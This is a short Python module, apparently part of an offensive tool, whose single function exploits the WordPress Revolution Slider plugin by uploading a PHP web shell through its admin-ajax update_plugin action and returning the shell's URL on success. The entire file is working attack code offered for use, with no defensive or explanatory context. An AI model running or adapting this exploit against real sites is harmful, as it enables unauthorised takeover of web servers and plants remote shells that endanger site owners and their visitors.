import requests

def exploit(site_url):
    upload_url = f"{site_url}/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=update_plugin"

    files = {
        'update_file': ('shell.php', open('payloads/simple_shell.php', 'rb'), 'application/x-php')
    }

    try:
        r = requests.post(upload_url, files=files, timeout=10)

        if r.status_code == 200 and "success" in r.text.lower():
            shell_url = f"{site_url}/wp-content/plugins/revslider/temp/update_extract/shell.php"
            print(f"[+] Exploited Revslider: {shell_url}")
            return True, shell_url
        else:
            print("[-] Revslider exploit failed.")
            return False, None
    except Exception as e:
        print(f"[!] Revslider Error: {e}")
        return False, None
